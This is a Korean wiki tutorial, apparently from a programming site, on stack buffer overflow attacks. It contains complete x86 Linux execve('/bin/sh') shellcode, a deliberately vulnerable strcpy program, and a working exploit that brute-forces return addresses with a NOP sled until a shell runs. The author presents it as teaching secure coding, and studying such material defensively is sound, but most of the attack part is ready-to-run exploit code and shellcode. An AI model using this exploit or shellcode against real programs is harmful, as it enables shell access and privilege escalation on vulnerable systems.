@@ -1,0 +1,218 @@
+== BOF (Buffer Over Flow) 기초상식 ==
+ {{{#!plain
+여기서 sample() 함수가 overflow exec shell 코드이고요.
+이건 이미 공식화된 코드이기 때문에 제가 조금 양념을 쳐서 이해하기 쉽게 만들어 본겁니다.
+해킹은 무지 싫어하지만 이런것도 명확히 알아둬야 자신의 코드가 튼튼해질겁니다.
+절대로 BOF(Buffer Over Flow)당할 코드는 만들지 마세요. 이글을 읽고서도 BOF취약 코드 만드는 사람은 바보~
+
+아래와 같은 코드를 만들기 위해서는 다음과 같은 단계를 진행하여 코드를 만듭니다.
+1. sample() 함수를 만든다.
+   조건: 스트링 함수를 공격하기 위한 코드이므로 반드시 코드내에는 0x00 이 없어야 합니다. 그래서 strcpy 에 의해서 공격코드가 복사될수 있겠지요.
+   원리: 일단 jmp 로 call 함수로 분기토록 틀을 만듦니다. 이때 near 가 아닌 short 형태의 분기여야 합니다. 이제 call 바로 하단에는 "/bin/sh\0" 을 넣는것이고 이것은 call 에 의해서 그 주소를 챙길수 있습니다. 그래서 call 로 분기후 popl 을 통해서 "/bin/sh" 의 주소를 얻어냅니다. 그 다음에는 execve(System call 0x0b번)을 이용해서 실행하는 코드를 생성합니다. 역시 주의할점은 기계어상태에서 0x00이 있으면 안됩니다. 그리고 execve실행후 종료토록 exit(System call 0x01번)을 호출하여 종료시킵니다.
+2. 이제 일단 컴파일만 합니다.
+3. objdump -D <목적파일.o> 를 사용하여 코드를 역 어셈블한 상태를 확인합니다. 여기서 sample 라벨을 찾아서 stack frame 을 빼고 jmp 부터 복사하여 배열을 만듦니다.
+4. 이제 sample 함수는 __mz_shell_code__ 로 만들어 진 상태이고 실제 테스트를 위한 함수를 만들어야 합니다. (실제 공격코드에는 bof() 함수가 아니라 프로그램 자체의 버퍼오버플로우 취약점이 될겁니다.)
+5. 이제 bof() 함수에는 한개의 dword 변수를 선언하고 이 주소를 취하여 dword 변수 자체 크기 4를 더하고 그로부터 다시 stack frame 을 건너띄기 위해서 4를 더한 위치에 __mz_shell_code__ 의 주소를 저장합니다.
+6. 이제 bof 함수는 버퍼오버플루우에 의해서 공격당한 함수의 전형적인 상태가 되었습니다.
+7. bof 가 리턴되면 __mz_shell_code__ 로 분기하게 되고 원하는 /bin/sh 가 실행되며 이로서 권한을 취득합니다.
+
+
+참고로 execve system call 의 내용은 다음과 같습니다.
+%%eax = 0x0b
+%%ebx = path/filename 포이터
+%%ecx = 인자 리스트 포인터
+%%edx = 환경변수 리스트 포인터
+int $0x80
+
+참고로 exit system call 의 내용은 다음과 같습니다.
+%%eax = 0x01
+%%ebx = exit code(return code)
+int $0x80
+}}}
+
+
+ {{{#!vim c
+/*
+Copyright (c) Information Equipment co.,LTD.
+All right reserved
+Code by JaeHyuk Cho <mailto:minzkn@infoeq.com>
+
+CVSTAG="$Header: /usr/local/mutihost/joinc/modules/moniwiki/data/text/RCS/BufferOverFlow,v 1.1 2007/01/09 02:46:09 root Exp root $"
+*/
+
+char __mz_shell_code__[] = {
+"\xeb\x1d"               /* jmp    0f               */
+                          /* 1:                      */
+"\x5e"                   /* pop    %esi             */               /* call 에 의해서 "/bin/sh" 의 주소가 담겨있게 됨. */
+"\x89\x76\x08"           /* mov    %esi,0x8(%esi)   */
+"\x31\xc0"               /* xor    %eax,%eax        */
+"\x88\x46\x07"           /* mov    %al,0x7(%esi)    */
+"\x89\x46\x0c"           /* mov    %eax,0xc(%esi)   */
+"\xb0\x0b"               /* mov    $0x0b,%al        */
+"\x89\xf3"               /* movl   %%esi, %%ebx     */
+"\x8d\x4e\x08"           /* lea    0x8(%esi),%ecx   */
+"\x31\xd2"               /* xor    %edx,%edx        */
+"\xcd\x80"               /* int    $0x80            */
+"\xb0\x01"               /* mov    $0x1,%al         */       /* exit system call part */
+"\x31\xdb"               /* xor    %ebx,%ebx        */
+"\xcd\x80"               /* int    $0x80            */
+                          /* 0:                      */
+"\xe8\xde\xff\xff\xff"   /* call   1b               */
+"/bin/sh"
+};
+
+void bof(void)
+{ /* 테스트를 위해 가상으로 BOF 피폭된 함수를 꾸미기 위한 함수 */
+volatile unsigned long s_Entry;
+s_Entry = (unsigned long)(&s_Entry) + sizeof(s_Entry) + sizeof(void *)/* frame */;
+*((unsigned long *)s_Entry) = (unsigned long)(&__mz_shell_code__);
+}
+
+#if 0 /* __mz_shell_code__ source  : 이것이 BOF 실행코드이며 이것을 토대로 코드가 완성됩니다. */
+void sample(void)
+{
+__asm__ volatile("nop\n\t");
+__asm__ volatile(
+  "jmp 0f\n\t"
+  "1:\n\t"
+  "popl %%esi\n\t"
+  "movl %%esi, 0x08(%%esi)\n\t"
+  "xorl %%eax, %%eax\n\t"
+  "movb %%al, 0x07(%%esi)\n\t"
+  "movl %%eax, 0x0c(%%esi)\n\t"
+  "movb $0x0b, %%al\n\t"
+  "movl %%esi, %%ebx\n\t"
+  "leal 0x08(%%esi), %%ecx\n\t"
+  "xorl %%edx, %%edx\n\t"
+  "int $0x80\n\t"
+  "movb $0x01, %%al\n\t"
+  "xorl %%ebx, %%ebx\n\t"
+  "int $0x80\n\t"
+  "0:\n\t"
+  "call 1b\n\t"
+  ".string \"/bin/bash\"\n\t"
+  :
+  :
+);
+__asm__ volatile("nop\n\t");
+}
+#endif 
+
+int main(void)
+{
+bof();
+return(0);
+} 
+}}}
+
+== 실전 BOF 공격양상 ==
+ * 실제로 공격이 어떻게 이루어지는지 직접 경험해봐야 자신의 코드를 더 튼튼히 할수 있을겁니다. 꼭 한번 실습해보시고 보안의 중요성을 인지하시게 되었으면 좋겠습니다.
+  * 자! 보안에 대해서 별로 신경쓰지 않는 어떤 사람이 다음과 같은 코드를 생성하였다고 합시다. (실제상황에서는 복잡한 프로그램겠지만 대충 다음과 같은 상황이 취약합니다.)
+  {{{#!vim c
+/* 
+ Code by fooman
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+int main(int s_Argc, char *s_Argv[])
+{  
+ char s_Message[ 8 ];
+ if(s_Argc <= 1)
+ {
+  fprintf(stdout, "Usage: %s <Message>\n", s_Argv[0]);
+  return(0);
+ }
+ strcpy(s_Message, s_Argv[1]);
+ fputs(s_Message, stdout);
+ return(0);
+}
+
+/* End of source */
+}}}
+  * 자! 위의 코드를 일단 test1.c 로 저장하고 test1 이라는 실행파일을 만듦니다. 이제 이것은 공격의 대상입니다.
+  * 그럼 공격코드를 만들어 보겠습니다. (이것이 실전에서 쓰이는 공격기법입니다. 자세히 관찰해보세요.)
+  {{{#!vim c
+/*  
+ Code by JaeHyuk Cho <mailto:minzkn@infoeq.com>
+ Attack code
+*/
+
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define DEF_ATTACK_PROGRAM      "./test1"
+#define DEF_ATTACK_RANGE        (4 << 10) /* 적정 scan 범위값을 취함 : 대상체의 규모가 클수록 이 값을 늘려야 겠죠? */
+#define DEF_TARGET_ARRAY_SIZE   (8) /* test1.c 의 s_Message의 크기는 8이므로 : 이것은 실험치로 잡아내야 함 */
+
+char __mz_shell_code__[] = {
+ "\xeb\x1d"               /* jmp    0f               */
+                          /* 1:                      */
+ "\x5e"                   /* pop    %esi             */
+ "\x89\x76\x08"           /* mov    %esi,0x8(%esi)   */
+ "\x31\xc0"               /* xor    %eax,%eax        */
+ "\x88\x46\x07"           /* mov    %al,0x7(%esi)    */
+ "\x89\x46\x0c"           /* mov    %eax,0xc(%esi)   */
+ "\xb0\x0b"               /* mov    $0x0b,%al        */
+ "\x89\xf3"               /* movl   %%esi, %%ebx     */
+ "\x8d\x4e\x08"           /* lea    0x8(%esi),%ecx   */
+ "\x31\xd2"               /* xor    %edx,%edx        */
+ "\xcd\x80"               /* int    $0x80            */
+ "\xb0\x01"               /* mov    $0x1,%al         */
+ "\x31\xdb"               /* xor    %ebx,%ebx        */
+ "\xcd\x80"               /* int    $0x80            */
+                          /* 0:                      */
+ "\xe8\xde\xff\xff\xff"   /* call   1b               */
+ "/bin/sh"
+ "\x00"
+};
+
+int main(void)
+{
+ unsigned long s_Address; /* 첫번째 스택 변수임을 주의합시다. */
+ char s_Arg[ DEF_TARGET_ARRAY_SIZE + 4 + sizeof(unsigned long) + sizeof(__mz_shell_code__) ];
+ char *s_Exec[] = { DEF_ATTACK_PROGRAM, (char *)(&s_Arg[0]), (char *)0 };
+
+ /* 적당히 코드가 실행되기 유리하도록 nop(0x90)을 사용 */
+ memset(&s_Arg[0], 0x90 /* nop */, DEF_TARGET_ARRAY_SIZE + 4); 
+ 
+ /* shell 실행 기계코드 복사 */
+ memcpy((void *)(&s_Arg[DEF_TARGET_ARRAY_SIZE + 4 + sizeof(unsigned long)]), (void *)(&__mz_shell_code__[0]), sizeof(__mz_shell_code__));
+ 
+ s_Address = (unsigned long)(&s_Address) - DEF_ATTACK_RANGE; /* 초기 scan 주소 */
+ do
+ { /* 루프를 기다려봅시다. ^^ */
+  fprintf(stdout, "ATTACK INFO : >> %08lXH <<\n", s_Address);
+  *((unsigned long *)(&s_Arg[DEF_TARGET_ARRAY_SIZE + 4])) = s_Address;
+  if(fork() == 0)
+  {
+   execvp(s_Exec[0], s_Exec);
+   exit(0);
+  }
+  else wait(0);
+  s_Address += sizeof(unsigned long);
+ }while(1);
+
+ fprintf(stdout, "\n\nBye.\n");
+
+ return(0);
+}
+
+/* End of source */
+}}}
+  * 이제 위의 코드를 test2.c 로 저장하고 test2로 실행파일을 만듦니다.
+  * test2 를 test1 이 있는곳에서 실행합니다.
+  * 경우에 따라서 실패를 하기도 하지만 아마도 대부분 조금있다가 쉘이 실행되는 것을 볼수 있을겁니다.
+  * 컴파일은 다음과 합니다.
+   {{{#!plain
+all: test1 test2
+clean: ;$(RM) *.o test1 test2
+test1: test1.o ;gcc -s -o $@ $^
+test2: test2.o ;gcc -s -o $@ $^
+%.o:%.c ;gcc -O0 -Wall -Werror -c -o $@ $<
+}}}
